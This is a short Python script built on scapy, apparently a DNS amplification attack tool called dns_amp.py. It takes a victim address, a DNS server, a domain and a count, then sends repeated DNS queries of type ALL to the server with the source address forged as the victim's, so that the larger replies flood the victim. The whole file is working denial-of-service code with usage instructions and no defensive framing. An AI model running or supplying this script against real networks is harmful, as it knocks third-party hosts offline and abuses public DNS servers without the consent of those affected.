import sys
import time
from scapy.all import *

argvs = sys.argv
argc = len(argvs)

# Message if argument is missing
if (argc != 5):
    print 'Usage: # dns_amp.py Target_IPaddress DNS_Server_IPaddress Domain Count'
    quit()

print 'Target is %s ' % argvs[1]
print 'DNS Server is %s ' % argvs[2]
print 'Domain is %s ' % argvs[3]
print 'Count is %d ' % long(sys.argv[4])
time.sleep(2.0)

# Variable setting
i = 0

# Making DNS packet with scapy
# Query type is fixed as any(ALL)
while i < long(sys.argv[4]):
    i += 1
    dnspkt = IP(src=argvs[1], dst=argvs[2]) / UDP(sport=60000 + i) / DNS(id=i, qd=DNSQR(qname=argvs[3], qtype="ALL"))
    reply = send(dnspkt)
